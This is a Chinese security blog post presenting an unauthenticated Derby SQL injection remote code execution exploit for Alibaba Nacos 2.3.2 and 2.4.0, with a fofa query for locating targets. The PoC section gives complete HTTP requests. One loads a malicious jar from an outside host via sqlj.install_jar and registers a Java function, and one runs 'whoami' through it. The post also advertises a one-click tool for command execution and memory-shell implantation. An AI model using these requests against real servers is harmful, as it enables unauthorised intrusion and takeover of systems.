#  Nacos Derby Sql注入RCE（常规出网）   
原创 SXdysq  南街老友   2024-07-17 20:47  
  
**漏洞描述**  
  
Nacos derby存在远程代码执行漏洞，由于Alibaba Nacos部分版本中derby数据库默认可以未授权访问，恶意攻击者利用此漏洞可以未授权执行SQL语句，从而远程加载恶意构造的jar包，最终导致任意代码执行。  
  
**影响版本**  
```
nacos 2.3.2
nacos 2.4.0
```  
  
  
**网络测绘**  
```
app="NACOS"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtAlExL3MPopGic4UMlrl6ZmuEjVnBVfQnICaBty4TqBSbRmy0djUe8jXUQL2RlOcYORzXYGLmTfWJg/640?wx_fmt=png&from=appmsg "")  
  
**漏洞Poc**  
```
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: 10.211.55.6:8848
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Content-Type: multipart/form-data; boundary=ac782d2c643a8b33dc0950fdc87cf06c
Content-Length: 501

--ac782d2c643a8b33dc0950fdc87cf06c
Content-Disposition: form-data; name="file"; filename="file"

CALL sqlj.install_jar('http://192.168.0.103:5000/download', 'NACOS.GiRyNcWh', 0)

            CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.GiRyNcWh')

            CREATE FUNCTION S_EXAMPLE_GiRyNcWh( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'

--ac782d2c643a8b33dc0950fdc87cf06c--

```  
```
GET /nacos/v1/cs/ops/derby?sql=select+%2A+from+%28select+count%28%2A%29+as+b%2C+S_EXAMPLE_ymLfaFog%28%27whoami%27%29+as+a+from+config_info%29+tmp+%2F%2AROWS+FETCH+NEXT%2A%2F HTTP/1.1
Host: 10.211.55.6:8848
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*

```  
  
  
**漏洞复现**  
  
目前已实现工具一键利用（漏洞Check、命令执行、打入内存马）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtAlExL3MPopGic4UMlrl6ZmuUgCibuevkRJe9o4jAo8wZwVRPCyT9rcQjyt77xS9RiaFt0Lia7RImUwXQ/640?wx_fmt=png&from=appmsg "")  
  
**工具获取**  
  
扫码加入获取利用工具，不定时更新poc与利用工具。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtAlExL3MPopGic4UMlrl6ZmuxuohAjynFZYHFGFYRjwuQkw3aaDaSvZzeAIsYMGuYsNOryLicLYsH4g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtAlExL3MPopGic4UMlrl6ZmuUWfzFdrFqYmTw5dBCp0ibmblUr4bBK2HibGPHwRMVtJvXdw1y1cvfmaQ/640?wx_fmt=png "")  
  
**🍻🍻🍻🍻🍻🍻**  
```
追梦路上，唯一的失败是放弃；唯一的成功是坚持。
你现在所浪费的每一分每一秒，都是别人未来所追求的时光。
生活不是等待风暴过去，而是学会在雨中翩翩起舞。
每一个不曾起舞的日子，都是对生命的辜负。
不要因为走得太远，忘了我们为什么出发。
努力不一定成功，但放弃一定失败。
当你觉得为时已晚时，恰恰是最早的时候。
你若盛开，清风自来。
成功的秘诀在于坚持不懈地追求。
相信自己，坚信自己的目标，去承受常人无法承受的磨难与挫折。
阳光总在风雨后，请相信有彩虹。
梦想是注定孤独的旅行，路上少不了质疑和嘲笑，但那又怎样。
没有伞的孩子必须努力奔跑。
没有比人更高的山，没有比脚更长的路。
时间是治疗心灵创伤的大师，但绝不是解决问题的高手。
你的心态就是你真正的主人。
把自己当成太阳去照亮别人，同时也温暖自己。
```  
  
  
  
  
  
  
  
